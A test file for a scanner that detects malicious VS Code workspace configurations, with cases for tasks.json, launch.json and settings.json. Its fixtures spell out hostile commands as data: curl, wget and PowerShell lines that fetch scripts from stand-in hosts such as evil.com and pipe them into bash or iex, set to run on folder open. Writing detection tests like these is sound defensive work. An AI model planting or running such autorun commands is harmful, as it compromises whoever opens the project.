// Tests for VS Code Security Rules

import { describe, it, expect } from 'vitest';
import {
  detectVSCodeTaskMalware,
  detectVSCodeLaunchMalware,
  detectVSCodeSettingsMalware,
} from '../vscodeRules';

describe('detectVSCodeTaskMalware', () => {
  describe('Malicious cases', () => {
    it('should detect folderOpen + curl (osx/linux/windows)', () => {
      const content = JSON.stringify({
        version: '2.0.0',
        tasks: [
          {
            label: 'Init',
            type: 'shell',
            command: 'echo "init"',
            runOptions: { runOn: 'folderOpen' },
            osx: { command: 'curl -s https://evil.com/payload.sh | bash' },
            linux: { command: 'wget -qO- https://evil.com/payload.sh | bash' },
            windows: { command: 'powershell -Command "iwr https://evil.com/payload.ps1 | iex"' },
          },
        ],
      });
      
      const findings = detectVSCodeTaskMalware('.vscode/tasks.json', content);
      
      expect(findings.length).toBeGreaterThanOrEqual(1);
      expect(findings[0].id).toBe('vscode-task-autorun-network-exec');
      expect(findings[0].severity).toBe('high');
      expect(findings[0].scoreDelta).toBeGreaterThanOrEqual(35);
    });
    
    it('should detect powershell Invoke-WebRequest with folderOpen', () => {
      const content = JSON.stringify({
        version: '2.0.0',
        tasks: [
          {
            label: 'Setup',
            type: 'shell',
            command: 'powershell -Command "Invoke-WebRequest -Uri https://evil.com/script.ps1 -OutFile script.ps1; ./script.ps1"',
            runOptions: { runOn: 'folderOpen' },
          },
        ],
      });
      
      const findings = detectVSCodeTaskMalware('.vscode/tasks.json', content);
      
      expect(findings.length).toBeGreaterThanOrEqual(1);
      expect(findings[0].evidence.note).toContain('Invoke-WebRequest');
    });
    
    it('should detect wget with piping to shell', () => {
      const content = JSON.stringify({
        version: '2.0.0',
        tasks: [
          {
            label: 'download',
            type: 'shell',
            command: 'wget -qO- https://attacker.com/backdoor | sh',
            runOptions: { runOn: 'folderOpen' },
          },
        ],
      });
      
      const findings = detectVSCodeTaskMalware('.vscode/tasks.json', content);
      
      expect(findings.length).toBeGreaterThanOrEqual(1);
      const note = findings[0].evidence.note.toLowerCase();
      expect(note).toContain('wget');
    });
    
    it('should add extra score for chaining', () => {
      const content = JSON.stringify({
        version: '2.0.0',
        tasks: [
          {
            label: 'malicious',
            type: 'shell',
            command: 'curl https://evil.com/script.sh | bash && chmod +x /tmp/backdoor',
            runOptions: { runOn: 'folderOpen' },
          },
        ],
      });
      
      const findings = detectVSCodeTaskMalware('.vscode/tasks.json', content);
      
      expect(findings.length).toBeGreaterThanOrEqual(1);
      // Should have higher score due to network + exec + chaining
      expect(findings[0].scoreDelta).toBeGreaterThan(35);
    });
  });
  
  describe('Benign cases', () => {
    it('should NOT flag build tasks without folderOpen', () => {
      const content = JSON.stringify({
        version: '2.0.0',
        tasks: [
          {
            label: 'Build',
            type: 'shell',
            command: 'npm run build',
            group: { kind: 'build', isDefault: true },
          },
          {
            label: 'Test',
            type: 'shell',
            command: 'npm test',
          },
        ],
      });
      
      const findings = detectVSCodeTaskMalware('.vscode/tasks.json', content);
      
      const autorunFindings = findings.filter(f => f.id === 'vscode-task-autorun-network-exec');
      expect(autorunFindings.length).toBe(0);
    });
    
    it('should NOT flag folderOpen with benign echo command', () => {
      const content = JSON.stringify({
        version: '2.0.0',
        tasks: [
          {
            label: 'Welcome',
            type: 'shell',
            command: 'echo "Welcome to this project!"',
            runOptions: { runOn: 'folderOpen' },
          },
        ],
      });
      
      const findings = detectVSCodeTaskMalware('.vscode/tasks.json', content);
      
      const autorunFindings = findings.filter(f => f.id === 'vscode-task-autorun-network-exec');
      expect(autorunFindings.length).toBe(0);
    });
    
    it('should NOT flag normal npm commands without autorun', () => {
      const content = JSON.stringify({
        version: '2.0.0',
        tasks: [
          {
            label: 'Install',
            type: 'shell',
            command: 'npm install',
          },
        ],
      });
      
      const findings = detectVSCodeTaskMalware('.vscode/tasks.json', content);
      
      expect(findings.length).toBe(0);
    });
  });
  
  describe('Edge cases', () => {
    it('should detect commands only in OS-specific fields', () => {
      const content = JSON.stringify({
        version: '2.0.0',
        tasks: [
          {
            label: 'Cross-platform malware',
            type: 'shell',
            runOptions: { runOn: 'folderOpen' },
            // No main command, only OS-specific
            osx: { command: 'curl https://evil.com/mac | bash' },
            linux: { command: 'wget https://evil.com/linux -O- | sh' },
            windows: { command: 'iwr https://evil.com/win.ps1 | iex' },
          },
        ],
      });
      
      const findings = detectVSCodeTaskMalware('.vscode/tasks.json', content);
      
      // Should detect findings for each OS
      expect(findings.length).toBeGreaterThanOrEqual(1);
    });
    
    it('should handle JSONC (comments) gracefully', () => {
      const content = `{
        // This is a comment
        "version": "2.0.0",
        /* Block comment */
        "tasks": [
          {
            "label": "Evil",
            "type": "shell",
            "command": "curl https://evil.com | bash", // inline comment
            "runOptions": { "runOn": "folderOpen" }
          }
        ]
      }`;
      
      const findings = detectVSCodeTaskMalware('.vscode/tasks.json', content);
      
      expect(findings.length).toBeGreaterThanOrEqual(1);
    });
    
    it('should handle trailing commas', () => {
      const content = `{
        "version": "2.0.0",
        "tasks": [
          {
            "label": "Evil",
            "type": "shell",
            "command": "wget https://evil.com | sh",
            "runOptions": { "runOn": "folderOpen" },
          },
        ],
      }`;
      
      const findings = detectVSCodeTaskMalware('.vscode/tasks.json', content);
      
      expect(findings.length).toBeGreaterThanOrEqual(1);
    });
    
    it('should handle empty tasks array', () => {
      const content = JSON.stringify({
        version: '2.0.0',
        tasks: [],
      });
      
      const findings = detectVSCodeTaskMalware('.vscode/tasks.json', content);
      
      expect(findings.length).toBe(0);
    });
    
    it('should handle malformed JSON gracefully', () => {
      const content = '{ invalid json }}}';
      
      const findings = detectVSCodeTaskMalware('.vscode/tasks.json', content);
      
      // Should not throw, just return empty
      expect(findings).toEqual([]);
    });
  });
});

describe('detectVSCodeLaunchMalware', () => {
  it('should detect programs in temp directories', () => {
    const content = JSON.stringify({
      version: '0.2.0',
      configurations: [
        {
          name: 'Suspicious',
          type: 'node',
          request: 'launch',
          program: '/tmp/hidden/malware.js',
        },
      ],
    });
    
    const findings = detectVSCodeLaunchMalware('.vscode/launch.json', content);
    
    expect(findings.length).toBeGreaterThanOrEqual(1);
    expect(findings[0].id).toBe('vscode-launch-temp-program');
  });
  
  it('should detect network commands in env vars', () => {
    const content = JSON.stringify({
      version: '0.2.0',
      configurations: [
        {
          name: 'Debug',
          type: 'node',
          request: 'launch',
          program: '${workspaceFolder}/app.js',
          env: {
            INIT_SCRIPT: 'curl https://evil.com/init.sh | bash',
          },
        },
      ],
    });
    
    const findings = detectVSCodeLaunchMalware('.vscode/launch.json', content);
    
    expect(findings.length).toBeGreaterThanOrEqual(1);
    expect(findings[0].id).toBe('vscode-launch-env-network');
  });
});

describe('detectVSCodeSettingsMalware', () => {
  it('should detect suspicious terminal profiles', () => {
    const content = JSON.stringify({
      'terminal.integrated.profiles.windows': {
        'Malicious Shell': {
          path: 'powershell.exe',
          args: ['-Command', 'iwr https://evil.com/shell.ps1 | iex'],
        },
      },
    });
    
    const findings = detectVSCodeSettingsMalware('.vscode/settings.json', content);
    
    expect(findings.length).toBeGreaterThanOrEqual(1);
    expect(findings[0].id).toBe('vscode-settings-terminal-network');
  });
});
